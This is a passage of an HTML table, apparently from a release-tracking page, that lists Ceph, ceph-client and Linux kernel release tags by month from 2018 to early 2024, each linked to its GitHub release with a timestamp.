00:00:32">v12.2.7</a><br><a href="https://github.com/ceph/ceph/releases/tag/v13.2.1" title="2018-07-27 01:40:01">v13.2.1</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2018-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.8" title="2018-08-31 01:24:42">v12.2.8</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.19-rc1" title="2018-08-20 23:01:58">ceph-for-4.19-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.18" title="2018-08-13 04:41:12">v4.18</a></td></tr><tr><td align="center">2018-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.2" title="2018-09-25 01:22:32">v13.2.2</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.19-rc3" title="2018-09-08 00:51:16">ceph-for-4.19-rc3</a></td><td align="center"></td></tr><tr><td align="center">2018-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.9" title="2018-10-25 05:04:20">v12.2.9</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.19" title="2018-10-22 14:47:45">v4.19</a></td></tr><tr><td align="center">2018-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.10" title="2018-11-27 03:36:01">v12.2.10</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.20-rc1" title="2018-11-01 01:35:22">ceph-for-4.20-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.20-rc2" title="2018-11-10 00:36:11">ceph-for-4.20-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.20-rc4" title="2018-11-24 02:37:44">ceph-for-4.20-rc4</a></td><td align="center"></td></tr><tr><td align="center">2018-12</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.20-rc7" title="2018-12-14 23:34:18">ceph-for-4.20-rc7</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v4.20" title="2018-12-24 07:56:06">v4.20</a></td></tr><tr><td align="center">2019-01</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.11" title="2019-01-30 23:51:28">v12.2.11</a><br><a href="https://github.com/ceph/ceph/releases/tag/v13.2.3" title="2019-01-03 02:01:00">v13.2.3</a><br><a href="https://github.com/ceph/ceph/releases/tag/v13.2.4" title="2019-01-04 23:40:45">v13.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-4.21-rc1" title="2019-01-03 22:46:17">ceph-for-4.21-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.0-rc2" title="2019-01-12 00:28:21">ceph-for-5.0-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.0-rc4" title="2019-01-24 23:36:34">ceph-for-5.0-rc4</a></td><td align="center"></td></tr><tr><td align="center">2019-02</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.0-rc8" title="2019-02-22 01:07:10">ceph-for-5.0-rc8</a></td><td align="center"></td></tr><tr><td align="center">2019-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.5" title="2019-03-13 00:48:07">v13.2.5</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.0" title="2019-03-18 18:08:30">v14.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.1-rc1" title="2019-03-12 23:50:51">ceph-for-5.1-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.1-rc2" title="2019-03-23 00:09:23">ceph-for-5.1-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.1-rc3" title="2019-03-30 00:18:54">ceph-for-5.1-rc3</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.0" title="2019-03-04 07:21:38">v5.0</a></td></tr><tr><td align="center">2019-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.12" title="2019-04-11 20:33:51">v12.2.12</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.1" title="2019-04-26 02:15:49">v14.2.1</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.1-rc7" title="2019-04-26 01:29:45">ceph-for-5.1-rc7</a></td><td align="center"></td></tr><tr><td align="center">2019-05</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.2-rc1" title="2019-05-16 22:35:00">ceph-for-5.2-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.1" title="2019-05-06 08:43:10">v5.1</a></td></tr><tr><td align="center">2019-06</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.6" title="2019-06-03 23:19:00">v13.2.6</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.2-rc4" title="2019-06-09 02:19:34">ceph-for-5.2-rc4</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.2-rc7" title="2019-06-28 23:09:25">ceph-for-5.2-rc7</a></td><td align="center"></td></tr><tr><td align="center">2019-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.2" title="2019-07-17 23:12:39">v14.2.2</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.3-rc1" title="2019-07-17 18:33:29">ceph-for-5.3-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.2" title="2019-07-08 06:42:04">v5.2</a></td></tr><tr><td align="center">2019-08</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.3-rc6" title="2019-08-23 20:15:48">ceph-for-5.3-rc6</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.3-rc7" title="2019-08-30 22:02:05">ceph-for-5.3-rc7</a></td><td align="center"></td></tr><tr><td align="center">2019-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.3" title="2019-09-03 21:19:59">v14.2.3</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.4" title="2019-09-14 02:07:43">v14.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.4-rc1" title="2019-09-26 00:23:30">ceph-for-5.4-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.3" title="2019-09-16 05:19:40">v5.3</a></td></tr><tr><td align="center">2019-10</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.4-rc4" title="2019-10-19 02:10:44">ceph-for-5.4-rc4</a></td><td align="center"></td></tr><tr><td align="center">2019-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.7" title="2019-11-21 01:36:37">v13.2.7</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.4-rc7" title="2019-11-08 23:31:29">ceph-for-5.4-rc7</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.4-rc8" title="2019-11-16 00:52:20">ceph-for-5.4-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.4" title="2019-11-25 08:32:07">v5.4</a></td></tr><tr><td align="center">2019-12</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.8" title="2019-12-13 05:09:44">v13.2.8</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.5" title="2019-12-07 00:42:39">v14.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.5-rc1" title="2019-12-05 03:25:51">ceph-for-5.5-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.5-rc2" title="2019-12-13 01:53:35">ceph-for-5.5-rc2</a></td><td align="center"></td></tr><tr><td align="center">2020-01</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.13" title="2020-01-31 04:52:37">v12.2.13</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.6" title="2020-01-09 02:36:55">v14.2.6</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.5-rc8" title="2020-01-24 01:28:44">ceph-for-5.5-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.5" title="2020-01-27 08:23:17">v5.5</a></td></tr><tr><td align="center">2020-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.7" title="2020-02-01 01:07:53">v14.2.7</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.6-rc1" title="2020-02-06 04:36:10">ceph-for-5.6-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.6-rc2" title="2020-02-15 00:17:12">ceph-for-5.6-rc2</a></td><td align="center"></td></tr><tr><td align="center">2020-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.8" title="2020-03-03 01:49:22">v14.2.8</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.0" title="2020-03-24 01:47:47">v15.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.6-rc8" title="2020-03-27 04:07:25">ceph-for-5.6-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.6" title="2020-03-30 06:25:50">v5.6</a></td></tr><tr><td align="center">2020-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v13.2.10" title="2020-04-24 00:32:33">v13.2.10</a><br><a href="https://github.com/ceph/ceph/releases/tag/v13.2.9" title="2020-04-16 23:49:41">v13.2.9</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.9" title="2020-04-10 00:17:29">v14.2.9</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.1" title="2020-04-09 01:51:50">v15.2.1</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.7-rc1" title="2020-04-09 00:26:03">ceph-for-5.7-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.7-rc2" title="2020-04-17 00:51:35">ceph-for-5.7-rc2</a></td><td align="center"></td></tr><tr><td align="center">2020-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.2" title="2020-05-19 00:25:13">v15.2.2</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.3" title="2020-05-30 00:24:51">v15.2.3</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.7-rc5" title="2020-05-09 00:59:33">ceph-for-5.7-rc5</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.7-rc8" title="2020-05-29 23:29:41">ceph-for-5.7-rc8</a></td><td align="center"></td></tr><tr><td align="center">2020-06</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.10" title="2020-06-26 01:32:34">v14.2.10</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.4" title="2020-06-30 23:40:52">v15.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.8-rc1" title="2020-06-08 22:55:21">ceph-for-5.8-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.8-rc2" title="2020-06-19 20:27:46">ceph-for-5.8-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.7" title="2020-06-01 07:49:24">v5.7</a></td></tr><tr><td align="center">2020-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.11" title="2020-08-11 04:15:23">v14.2.11</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.9-rc1" title="2020-08-13 00:42:15">ceph-for-5.9-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.9-rc3" title="2020-08-28 19:50:53">ceph-for-5.9-rc3</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.8" title="2020-08-03 05:21:45">v5.8</a></td></tr><tr><td align="center">2020-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.5" title="2020-09-16 02:57:06">v15.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.9-rc5" title="2020-09-11 22:10:53">ceph-for-5.9-rc5</a></td><td align="center"></td></tr><tr><td align="center">2020-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.12" title="2020-10-20 04:19:22">v14.2.12</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.13" title="2020-10-30 22:54:38">v14.2.13</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.10-rc1" title="2020-10-21 20:49:15">ceph-for-5.10-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.9" title="2020-10-12 05:15:50">v5.9</a></td></tr><tr><td align="center">2020-11</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.14" title="2020-11-18 02:10:13">v14.2.14</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.15" title="2020-11-24 02:30:16">v14.2.15</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.6" title="2020-11-18 02:12:55">v15.2.6</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.10-rc3" title="2020-11-07 03:08:51">ceph-for-5.10-rc3</a></td><td align="center"></td></tr><tr><td align="center">2020-12</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.16" title="2020-12-17 01:35:04">v14.2.16</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.7" title="2020-12-01 03:58:31">v15.2.7</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.8" title="2020-12-17 01:29:53">v15.2.8</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.11-rc1" title="2020-12-17 23:26:29">ceph-for-5.11-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.11-rc2" title="2020-12-31 01:13:49">ceph-for-5.11-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.10" title="2020-12-14 06:41:30">v5.10</a></td></tr><tr><td align="center">2021-01</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.11-rc5" title="2021-01-22 23:51:26">ceph-for-5.11-rc5</a></td><td align="center"></td></tr><tr><td align="center">2021-02</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.9" title="2021-02-23 22:10:17">v15.2.9</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.12-rc1" title="2021-02-22 21:18:04">ceph-for-5.12-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.11" title="2021-02-15 06:32:24">v5.11</a></td></tr><tr><td align="center">2021-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.17" title="2021-03-12 01:07:33">v14.2.17</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.18" title="2021-03-16 01:46:23">v14.2.18</a><br><a href="https://github.com/ceph/ceph/releases/tag/v14.2.19" title="2021-03-31 00:19:19">v14.2.19</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.10" title="2021-03-18 01:02:41">v15.2.10</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.0" title="2021-03-31 05:13:30">v16.2.0</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2021-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.20" title="2021-04-19 22:11:16">v14.2.20</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.11" title="2021-04-19 21:47:33">v15.2.11</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.1" title="2021-04-19 21:50:10">v16.2.1</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.12" title="2021-04-26 04:49:08">v5.12</a></td></tr><tr><td align="center">2021-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.21" title="2021-05-14 01:23:10">v14.2.21</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.12" title="2021-05-14 01:26:14">v15.2.12</a><br><a href="https://github.com/ceph/ceph/releases/tag/v15.2.13" title="2021-05-27 03:24:08">v15.2.13</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.2" title="2021-05-05 02:38:24">v16.2.2</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.3" title="2021-05-06 23:47:02">v16.2.3</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.4" title="2021-05-14 01:20:30">v16.2.4</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.13-rc1" title="2021-05-06 21:34:25">ceph-for-5.13-rc1</a></td><td align="center"></td></tr><tr><td align="center">2021-06</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v14.2.22" title="2021-06-30 06:09:11">v14.2.22</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.13-rc8" title="2021-06-25 21:53:34">ceph-for-5.13-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.13" title="2021-06-28 06:21:11">v5.13</a></td></tr><tr><td align="center">2021-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.5" title="2021-07-08 22:03:58">v16.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.14-rc1" title="2021-07-09 03:44:46">ceph-for-5.14-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.14-rc3" title="2021-07-24 00:27:24">ceph-for-5.14-rc3</a></td><td align="center"></td></tr><tr><td align="center">2021-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.14" title="2021-08-06 01:11:55">v15.2.14</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.14-rc6" title="2021-08-13 02:26:48">ceph-for-5.14-rc6</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.14-rc8" title="2021-08-26 23:40:30">ceph-for-5.14-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.14" title="2021-08-30 06:04:50">v5.14</a></td></tr><tr><td align="center">2021-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.6" title="2021-09-16 22:27:21">v16.2.6</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.15-rc1" title="2021-09-08 22:36:36">ceph-for-5.15-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.15-rc3" title="2021-09-24 19:40:13">ceph-for-5.15-rc3</a></td><td align="center"></td></tr><tr><td align="center">2021-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.15" title="2021-10-20 22:19:59">v15.2.15</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.15-rc7" title="2021-10-21 02:07:14">ceph-for-5.15-rc7</a></td><td align="center"></td></tr><tr><td align="center">2021-11</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.16-rc1" title="2021-11-12 18:41:14">ceph-for-5.16-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.15" title="2021-11-01 04:53:10">v5.15</a></td></tr><tr><td align="center">2021-12</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v12.2.14" title="2021-12-16 06:05:25">v12.2.14</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.7" title="2021-12-08 00:15:50">v16.2.7</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.16-rc6" title="2021-12-15 20:35:41">ceph-for-5.16-rc6</a></td><td align="center"></td></tr><tr><td align="center">2022-01</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.17-rc1" title="2022-01-20 18:53:05">ceph-for-5.17-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.17-rc2" title="2022-01-29 00:03:43">ceph-for-5.17-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.16" title="2022-01-10 06:55:34">v5.16</a></td></tr><tr><td align="center">2022-02</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.17-rc3" title="2022-02-04 20:54:25">ceph-for-5.17-rc3</a></td><td align="center"></td></tr><tr><td align="center">2022-03</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.16" title="2022-03-01 14:44:31">v15.2.16</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.18-rc1" title="2022-03-25 01:20:10">ceph-for-5.18-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.17" title="2022-03-21 04:14:17">v5.17</a></td></tr><tr><td align="center">2022-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.0" title="2022-04-19 06:08:29">v17.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.18-rc5" title="2022-04-30 00:22:04">ceph-for-5.18-rc5</a></td><td align="center"></td></tr><tr><td align="center">2022-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.8" title="2022-05-13 06:23:14">v16.2.8</a><br><a href="https://github.com/ceph/ceph/releases/tag/v16.2.9" title="2022-05-19 03:51:52">v16.2.9</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.18-rc7" title="2022-05-14 01:03:55">ceph-for-5.18-rc7</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.18-rc8" title="2022-05-20 23:14:01">ceph-for-5.18-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.18" title="2022-05-23 03:52:31">v5.18</a></td></tr><tr><td align="center">2022-06</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.1" title="2022-06-23 22:41:35">v17.2.1</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.19-rc1" title="2022-06-02 20:55:20">ceph-for-5.19-rc1</a></td><td align="center"></td></tr><tr><td align="center">2022-07</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.10" title="2022-07-22 01:28:56">v16.2.10</a><br><a href="https://github.com/ceph/ceph/releases/tag/v17.2.2" title="2022-07-22 01:29:33">v17.2.2</a><br><a href="https://github.com/ceph/ceph/releases/tag/v17.2.3" title="2022-07-29 05:52:13">v17.2.3</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.19-rc5" title="2022-07-01 22:57:53">ceph-for-5.19-rc5</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.19-rc7" title="2022-07-16 00:27:09">ceph-for-5.19-rc7</a></td><td align="center"></td></tr><tr><td align="center">2022-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v15.2.17" title="2022-08-10 01:07:02">v15.2.17</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-5.20-rc1" title="2022-08-11 23:12:14">ceph-for-5.20-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v5.19" title="2022-08-01 05:03:01">v5.19</a></td></tr><tr><td align="center">2022-09</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.4" title="2022-09-29 06:55:59">v17.2.4</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2022-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.5" title="2022-10-18 04:07:31">v17.2.5</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.1-rc1" title="2022-10-13 23:14:45">ceph-for-6.1-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.0" title="2022-10-03 05:09:07">v6.0</a></td></tr><tr><td align="center">2022-11</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.1-rc6" title="2022-11-18 05:19:21">ceph-for-6.1-rc6</a></td><td align="center"></td></tr><tr><td align="center">2022-12</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.2-rc1" title="2022-12-15 00:56:52">ceph-for-6.2-rc1</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.1" title="2022-12-12 06:15:18">v6.1</a></td></tr><tr><td align="center">2023-01</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.11" title="2023-01-25 04:43:14">v16.2.11</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.2-rc3" title="2023-01-07 02:26:09">ceph-for-6.2-rc3</a></td><td align="center"></td></tr><tr><td align="center">2023-02</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.2-rc7" title="2023-02-04 02:04:57">ceph-for-6.2-rc7</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.2-rc8" title="2023-02-10 23:58:18">ceph-for-6.2-rc8</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.2" title="2023-02-20 06:24:22">v6.2</a></td></tr><tr><td align="center">2023-03</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.3-rc1" title="2023-03-03 00:42:44">ceph-for-6.3-rc1</a></td><td align="center"></td></tr><tr><td align="center">2023-04</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.12" title="2023-04-20 05:33:07">v16.2.12</a><br><a href="https://github.com/ceph/ceph/releases/tag/v17.2.6" title="2023-04-05 23:09:51">v17.2.6</a></td><td align="center"></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.3" title="2023-04-24 03:02:52">v6.3</a></td></tr><tr><td align="center">2023-05</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.13" title="2023-05-09 04:39:37">v16.2.13</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.4-rc1" title="2023-05-05 02:11:25">ceph-for-6.4-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.4-rc3" title="2023-05-20 00:04:28">ceph-for-6.4-rc3</a></td><td align="center"></td></tr><tr><td align="center">2023-06</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.4-rc6" title="2023-06-10 00:17:37">ceph-for-6.4-rc6</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.4" title="2023-06-26 07:29:58">v6.4</a></td></tr><tr><td align="center">2023-07</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.5-rc1" title="2023-07-07 23:28:20">ceph-for-6.5-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.5-rc2" title="2023-07-14 23:10:03">ceph-for-6.5-rc2</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.5-rc4" title="2023-07-29 00:27:26">ceph-for-6.5-rc4</a></td><td align="center"></td></tr><tr><td align="center">2023-08</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v16.2.14" title="2023-08-29 23:43:59">v16.2.14</a><br><a href="https://github.com/ceph/ceph/releases/tag/v18.2.0" title="2023-08-04 00:53:13">v18.2.0</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.5-rc5" title="2023-08-04 23:07:42">ceph-for-6.5-rc5</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.5" title="2023-08-28 05:49:51">v6.5</a></td></tr><tr><td align="center">2023-09</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.6-rc1" title="2023-09-07 00:16:33">ceph-for-6.6-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.6-rc4" title="2023-09-29 22:50:27">ceph-for-6.6-rc4</a></td><td align="center"></td></tr><tr><td align="center">2023-10</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v17.2.7" title="2023-10-26 07:46:16">v17.2.7</a></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.6-rc6" title="2023-10-13 23:21:08">ceph-for-6.6-rc6</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.6" title="2023-10-30 10:31:08">v6.6</a></td></tr><tr><td align="center">2023-11</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.7-rc1" title="2023-11-10 00:27:21">ceph-for-6.7-rc1</a></td><td align="center"></td></tr><tr><td align="center">2023-12</td><td align="center"><a href="https://github.com/ceph/ceph/releases/tag/v18.2.1" title="2023-12-12 05:55:38">v18.2.1</a></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">2024-01</td><td align="center"></td><td align="center"><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc1" title="2024-01-19 23:40:20">ceph-for-6.8-rc1</a><br><a href="https://github.com/ceph/ceph-client/releases/tag/ceph-for-6.8-rc2" title="2024-01-25 04:12:56">ceph-for-6.8-rc2</a></td><td align="center"><a href="https://github.com/torvalds/linux/releases/tag/v6.7" title="2024-01-08 